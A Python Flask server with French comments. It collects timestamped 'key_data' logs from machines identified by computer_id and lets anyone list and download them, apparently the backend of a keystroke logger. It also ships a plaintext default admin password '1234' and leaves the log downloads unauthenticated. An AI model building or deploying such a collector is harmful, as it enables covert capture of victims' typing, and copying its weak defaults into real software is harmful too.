from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)

# Répertoire de stockage des fichiers
SAVE_DIR = "received_files"
FILE_PATH = os.path.join(SAVE_DIR, "received_data.json")
USER_FILE = os.path.join(SAVE_DIR, "users.json")
os.makedirs(SAVE_DIR, exist_ok=True)

# Charger les logs
def load_logs_data():
    if os.path.exists(FILE_PATH):
        try:
            with open(FILE_PATH, "r", encoding="utf-8") as f:
                logs_data = json.load(f)
                if not isinstance(logs_data, dict):
                    logs_data = {}  # Réinitialiser si ce n'est pas un dictionnaire
        except (json.JSONDecodeError, IOError) as e:
            print(f"Error loading file: {e}")
            logs_data = {}
    else:
        logs_data = {}
    return logs_data

logs_data = load_logs_data()

@app.route('/upload', methods=['POST'])
def upload_json():
    try:
        data = request.get_json()
        print(f"Received data: {data}")  # Log the entire request body

        if not isinstance(data, dict):
            return jsonify({"error": "Invalid JSON format"}), 400

        computer_id = data.get("computer_id")
        logs = data.get("logs")

        if not isinstance(computer_id, str) or not isinstance(logs, dict):
            return jsonify({"error": "Invalid JSON structure"}), 400

        for timestamp, log_data in logs.items():
            if not isinstance(log_data, dict) or 'key_data' not in log_data:
                return jsonify({"error": f"Invalid log format for timestamp {timestamp}"}), 400

        logs_data.setdefault(computer_id, {})
        logs_data[computer_id].update(logs)

        with open(FILE_PATH, "w", encoding="utf-8") as f:
            json.dump(logs_data, f, indent=4, ensure_ascii=False)

        return jsonify({"message": "Logs stored successfully"}), 200

    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({"error": str(e)}), 500


@app.route('/computers', methods=['GET'])
def get_computers():
    try:
        return jsonify({"computers": list(logs_data.keys())}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/download/<computer_id>', methods=['GET'])
def download_json(computer_id):
    try:
        if computer_id in logs_data:
            return jsonify(logs_data[computer_id]), 200
        else:
            return jsonify({"error": "No logs found for this computer"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Charger les utilisateurs depuis le fichier
def load_users():
    if os.path.exists(USER_FILE):
        try:
            with open(USER_FILE, "r", encoding="utf-8") as f:
                return json.load(f).get("users", {})
        except (json.JSONDecodeError, IOError) as e:
            print(f"Error loading users file: {e}")
            return {}
    else:
        return {}

# Vérifier si users.json existe, sinon le créer avec un utilisateur par défaut
if not os.path.exists(USER_FILE):
    default_users = {"users": {"admin": "1234"}}  # Ajouter un admin par défaut
    with open(USER_FILE, "w", encoding="utf-8") as f:
        json.dump(default_users, f, indent=4, ensure_ascii=False)

users = load_users()

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")

    if username in users and users[username] == password:
        return jsonify({"message": "Connexion réussie"}), 200
    else:
        return jsonify({"error": "Identifiants incorrects"}), 401

if __name__ == '__main__':
    app.run(debug=True)
